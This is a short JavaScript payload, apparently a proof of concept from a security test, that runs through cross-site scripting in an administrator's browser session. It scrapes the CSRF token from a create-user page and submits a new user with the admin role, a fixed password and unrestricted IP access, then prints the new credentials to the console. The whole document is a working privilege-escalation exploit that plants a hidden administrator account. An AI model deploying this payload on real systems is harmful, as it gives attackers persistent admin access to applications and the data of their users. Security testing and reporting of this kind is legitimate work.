(async () => {
  const createPage = await fetch("/client/settings/users/create", { credentials: "include" })
    .then(r => r.text());

  const tokenMatch = createPage.match(/name="_token"\s+value="([^"]+)"/);
  if (!tokenMatch) return console.error("Token not found in create-user page");

  const token = tokenMatch[1];
  const email = "eroel+spprivesc_" + Date.now() + "@secuna.io";
  const password = "S9v!tN#2gFqX@4zW";

  const body = new URLSearchParams({
    _token: token,
    name: "SECUNA PRIVESC FROM ENCODER",
    email: email,
    nickname: "privescfromencoder",
    birthdate: "1990-01-01",
    nationality: "Filipino",
    passport_no: "123456789",
    role_id: "1",                     // Admin role
    signatory: "0",
    on_e_sign: "0",
    password: password,
    password_confirmation: password,
    user_status: "1",
    allow_all_ip: "1"
  });

  // Step 3: Send create-user POST using admin's cookie session
  const result = await fetch("/client/settings/users", {
    method: "POST",
    credentials: "include",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: body.toString()
  }).then(r => r.text());

  // Step 4: Output new account information to console for proof
  console.log("[XSS ➜ Admin User Created]");
  console.log("Email:", email);
  console.log("Password:", password);
  console.log("Server Response:", result);
})();
